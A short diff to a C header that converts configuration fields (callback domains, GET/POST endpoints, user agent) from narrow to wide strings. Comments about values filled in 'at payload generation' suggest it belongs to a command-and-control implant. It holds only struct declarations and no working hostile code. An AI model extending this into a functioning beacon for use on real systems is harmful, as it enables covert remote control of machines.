@@ -4,7 +4,7 @@
 #define MAX_DOMAIN_COUNT 3 // todo, computer and update this at payload generation
 
 typedef struct _DomainEntry {
-	CHAR domain[256];
+	WCHAR domain[256];
 	UINT  port;
 	BOOL isHttps;
 	BOOL isDead;
@@ -17,11 +17,10 @@ struct Config {
 	DomainEntry domains[MAX_DOMAIN_COUNT];
 	size_t domaincounts;
 
-
 	// also calcuate these 3 below at generation time
-	CHAR GetEndpoint[64];
-	CHAR PostEndpoint[64];
-	CHAR UA[112];
+	WCHAR GetEndpoint[64];
+	WCHAR PostEndpoint[64];
+	WCHAR UA[256];
 
 
 
